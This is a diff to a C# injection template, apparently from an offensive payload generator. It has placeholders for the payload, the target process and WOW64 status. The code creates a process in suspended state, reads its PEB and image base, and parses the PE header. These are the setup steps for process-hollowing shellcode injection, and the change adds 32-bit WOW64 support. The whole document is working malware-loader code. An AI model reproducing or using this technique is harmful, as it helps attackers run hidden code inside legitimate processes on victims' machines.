@@ -80,6 +80,8 @@ namespace Craft
         {
             {{PAYLOAD}}
 
+            bool isWow64 = {{ISWOW64}};
+            
             StartupInfo sInfo = new StartupInfo();
             ProcessInfo pInfo = new ProcessInfo();
             bool cResult = CreateProcess(null, "{{PROCESS}}", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
@@ -87,13 +89,13 @@ namespace Craft
             ProcessBasicInfo pbInfo = new ProcessBasicInfo();
             uint retLen = new uint();
             long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
-            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
+            IntPtr baseImageAddr = isWow64 ? (IntPtr)((Int32)pbInfo.PebAddress + 0x08) : (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
 
             byte[] procAddr = new byte[0x8];
-            byte[] dataBuf = new byte[0x200];
+            byte[] dataBuf = new byte[0x400];
             IntPtr bytesRW = new IntPtr();
             bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
-            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
+            IntPtr executableAddress = isWow64 ? (IntPtr)BitConverter.ToInt32(procAddr, 0) : (IntPtr)BitConverter.ToInt64(procAddr, 0);
             result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
 
             uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3C);
